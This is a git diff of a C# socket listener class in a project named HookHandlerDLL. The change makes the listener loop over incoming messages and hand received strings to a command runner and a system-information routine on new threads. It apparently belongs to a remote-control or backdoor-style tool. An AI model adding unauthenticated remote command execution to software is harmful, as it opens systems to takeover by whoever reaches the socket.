@@ -5,6 +5,7 @@ using System.IO;
 using System.Linq;
 using System.Net.Sockets;
 using System.Text;
+using System.Threading;
 using System.Threading.Tasks;
 
 namespace HookHandlerDLL
@@ -12,38 +13,52 @@ namespace HookHandlerDLL
     class ClientListener
     {
         Socket socket;
-
+        bool isRun;
+        CommandRunner commandRunner;
+        SystemInformer systemInformer;
         public ClientListener(Socket socket)
         {
             this.socket = socket;
+            isRun = true;
+            commandRunner = new CommandRunner(socket);
+            systemInformer = new SystemInformer(socket);
         }
 
         public void Run()
         {
-            try
+            
+            while (isRun)
             {
-                byte[] type = new byte[1];
-                socket.Receive(type);
-                byte[] data = ReceiveVarData(socket);
-
-                switch (type[0])
+                try
                 {
-                    case 0:
-                        string message = Encoding.UTF8.GetString(data);
-                        break;
-                    case 1:
-                        MemoryStream ms = new MemoryStream(data);
-                        Image bmp = Image.FromStream(ms);
-                        break;
-                    case 2:
-                        break;
-                }
+                    byte[] type = new byte[1];
+                    socket.Receive(type);
+                    byte[] data = ReceiveVarData(socket);
 
-            }
-            catch (Exception e)
-            {
-                Console.WriteLine(e.StackTrace);
-            }
+                    switch (type[0])
+                    {
+                        case 0:
+                            string command = Encoding.UTF8.GetString(data);
+                            new Thread(()=>commandRunner.Run(command)).Start();
+                            break;
+                        case 1:
+                            string path = Encoding.UTF8.GetString(data);
+                            new Thread(() => systemInformer.Run(path)).Start();
+                            break;
+                    }
+                }
+                catch 
+                {
+                    Stop();
+                }
+            }              
+            
+        }
+
+        public void Stop()
+        {
+            isRun = false;
+            socket.Close();
         }
 
         private byte[] ReceiveVarData(Socket client)
@@ -70,5 +85,7 @@ namespace HookHandlerDLL
             }
             return data;
         }
+
+
     }
 }
